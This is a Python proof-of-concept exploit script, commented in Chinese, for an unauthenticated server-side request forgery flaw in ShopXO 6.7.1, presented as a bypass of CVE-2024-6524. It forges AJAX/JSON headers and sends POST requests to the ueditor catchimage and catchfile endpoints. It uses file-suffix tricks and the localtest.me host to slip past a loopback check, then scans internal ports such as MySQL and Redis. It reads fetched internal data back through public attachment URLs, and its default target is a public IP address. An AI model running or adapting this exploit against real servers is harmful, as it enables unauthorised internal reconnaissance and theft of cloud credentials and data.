#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ShopXO 6.7.1 Unauthenticated SSRF Ultimate PoC (CVE-2024-6524 Bypass)
=====================================================================
[+] 鉴权绕过: 无需 Cookie (Pre-Auth 验证)
[+] 异常绕过: 完美绕过 PHP 8 数组崩溃 (Accept: application/json)
[+] 拦截绕过: 完美绕过非法访问拦截 (X-Requested-With: XMLHttpRequest)
[+] 路由穿透: ThinkPHP 单应用默认绑定精确打击 (s=ueditor/index)
[+] 参数闭环: POST 提交 source[] 完美绕过 "没有相关数据" 报错 (NEW!)
[+] 逻辑绕过: 利用物理网卡 IP 完美绕过 GetUrlHost 域名碰撞拦截 (NEW!)
"""

import requests
import argparse
import urllib3
import threading
import time
import json
from http.server import BaseHTTPRequestHandler, HTTPServer

# 禁用自签名证书告警
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ==========================================
# 模块一：内置微型 HTTP 靶机 (模拟云端元数据)
# ==========================================
class MockCloudMetadataHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        # 模拟高价值目标响应
        mock_data = '{"Status": "Pwned!", "AccessKeyId":"AKIA_HACKER_WIN_8888","Secret":"SSRF_Bypass_Success_From_192.168.10.9"}'
        self.wfile.write(mock_data.encode('utf-8'))

    def log_message(self, format, *args):
        pass  # 保持终端干净


def start_mock_server(port=8888):
    # 监听 0.0.0.0，确保物理网卡 IP 也能访问到
    server = HTTPServer(('0.0.0.0', port), MockCloudMetadataHandler)
    server.serve_forever()


# ==========================================
# 模块二：SSRF 漏洞利用核心
# ==========================================
class ShopXOUltimateExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')

        # 完美的请求头伪装
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SSRF-Ultimate",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json"
        }

    def _send_ssrf(self, action, payload):
        """发送底层 SSRF 请求 (POST 完美参数闭环版)"""
        endpoint = f"{self.target_url}/index.php"

        # 路由和动作留在 URL 里
        params = {
            "s": "ueditor/index",
            "action": action
        }

        # 【致胜关键 1】将 SSRF 的目标 URL 放到 POST 表单里，并用标准的 source[] 命名
        post_data = {
            "source[]": payload
        }

        try:
            # 发送 POST 请求
            resp = requests.post(endpoint, params=params, data=post_data, headers=self.headers, verify=False, timeout=8)

            if resp.status_code != 200:
                print(f"  [HTTP 异常] 状态码: {resp.status_code}")

            try:
                return resp.json()
            except Exception:
                print(f"  [解析异常] 服务器返回了非 JSON 内容:\n  {resp.text[:200]}")
                return None
        except Exception as e:
            print(f"  [网络异常] 请求报错: {e}")
            return None

    def scan_local_ports(self, ip, ports=[80, 3306, 6379, 8888]):
        """阶段一：内网端口探测"""
        print(f"\n[>>>] 阶段一：目标内网端口探测 (利用物理 IP 视角: {ip})")
        for port in ports:
            # 伪造图片后缀过基础检查
            payload = f"http://{ip}:{port}/test.png"
            data = self._send_ssrf("catchimage", payload)

            if not data:
                print(f"  [-] 端口 {port:<5} [请求无响应]")
                continue

            if data.get("code") == 0 and "list" in data:
                file_info = data["list"][0]
                inner_state = file_info.get("state", "")

                if inner_state == "SUCCESS" and file_info.get("size", 0) > 0:
                    print(f"  [+] 端口 {port:<5} [开放] (抓取成功，大小: {file_info.get('size')} bytes)")
                elif "dead_link" in inner_state or "不可用" in inner_state:
                    print(f"  [-] 端口 {port:<5} [关闭/被拒] (目标未开放或协议不兼容)")
                elif "error_type_not_allowed" in inner_state:
                    print(f"  [!] 端口 {port:<5} [开放] (触发纯文本安全拦截机制)")
                else:
                    print(f"  [*] 端口 {port:<5} [状态未知] ({inner_state})")
            else:
                print(f"  [x] 端口 {port:<5} [失败] 服务器报错: {json.dumps(data, ensure_ascii=False)}")

    def exploit_read_out(self, ip, mock_port=8888):
        """阶段二：文件窃取 (Read-out 验证)"""
        print(f"\n[>>>] 阶段二：敏感数据窃取测试 (Read-out 回显验证)")
        print(f"[*] 尝试指令 ShopXO 去抓取: http://{ip}:{mock_port}/metadata")

        # 使用 catchfile 动作获取非图片文件，并利用 ?x=.txt 绕过正则后缀验证
        payload = f"http://{ip}:{mock_port}/metadata?x=.txt"
        data = self._send_ssrf("catchfile", payload)

        if not data:
            print("[-] SSRF 请求无响应。")
            return

        if data.get("state") == "SUCCESS" and "list" in data:
            file_info = data["list"][0]
            if file_info.get("state") == "SUCCESS" and "url" in file_info:
                attachment_url = self.target_url + file_info["url"]
                print(f"[+] SSRF 触发成功！内网数据已被 ShopXO 抓取并落盘为公开附件。")
                print(f"[*] 回显附件地址: {attachment_url}")
                print(f"[*] 正在读取战果...\n")

                try:
                    # 去读取我们抓取到的附件
                    resp = requests.get(attachment_url, headers={"User-Agent": "Mozilla/5.0"}, verify=False)
                    if resp.status_code == 200:
                        print("=" * 65)
                        print(resp.text.strip())
                        print("=" * 65)
                        print("\n[√] 完美通关：全流程 SSRF 漏洞验证成功！")
                    else:
                        print(f"[-] 附件下载失败，HTTP 状态码: {resp.status_code}")
                except Exception as e:
                    print(f"[-] 下载战果时报错: {e}")
            else:
                print(f"[-] 文件抓取失败，内部状态: {file_info.get('state')}")
        else:
            print(f"[-] SSRF 利用失败。服务器反馈: {json.dumps(data, ensure_ascii=False)}")


def main():
    parser = argparse.ArgumentParser(description="ShopXO SSRF 终极漏洞利用工具")
    # 默认 target 改为你本地测试最常用的地址
    parser.add_argument("-t", "--target", default="http://116.198.220.135/shopxo",
                        help="目标 URL, 例: http://127.0.0.1/shopxo")
    args = parser.parse_args()

    print("=" * 65)
    print(" ShopXO 6.7.1 SSRF 深度复现与验证工具 (Ultimate Edition)")
    print("=" * 65)

    mock_port = 8888
    print(f"[*] 正在本地启动模拟云端靶机 (端口: {mock_port})...")
    mock_thread = threading.Thread(target=start_mock_server, args=(mock_port,), daemon=True)
    mock_thread.start()
    time.sleep(1)

    # 【致胜关键 2】使用你的无线网卡物理 IP，完美绕过 GetUrlHost == 127.0.0.1 的自我防抓取保护
    bypass_ip = "localtest.me"
    print(f"[*] 注入高级 Bypass 策略: 使用物理网卡 IP [{bypass_ip}] 绕过防回环检测")

    exploit = ShopXOUltimateExploit(args.target)

    # 执行扫港
    exploit.scan_local_ports(ip=bypass_ip, ports=[80, 3306, 6379, mock_port])

    # 执行读取
    exploit.exploit_read_out(ip=bypass_ip, mock_port=mock_port)


if __name__ == "__main__":
    main()